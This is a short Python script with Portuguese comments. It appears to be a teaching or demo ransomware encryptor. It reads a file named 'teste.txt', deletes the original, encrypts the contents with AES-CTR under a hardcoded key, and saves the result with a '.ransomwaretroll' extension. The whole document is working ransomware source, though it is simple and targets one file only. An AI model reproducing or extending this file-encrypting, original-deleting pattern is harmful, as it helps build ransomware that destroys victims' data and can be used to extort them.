import os
import pyaes

# Arquivo a criptografar
file_name = 'teste.txt'
file_open = open(file_name, 'rb')
file_data = file_open.read()
file_open.close()  # Corrigido para fechar o arquivo corretamente

# Remoção do arquivo original
os.remove(file_name)

# Definindo a chave de criptografia
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar arquivo criptografado
new_file_name = file_name + '.ransomwaretroll'
with open(new_file_name, "wb") as new_file: 
    new_file.write(crypto_data)
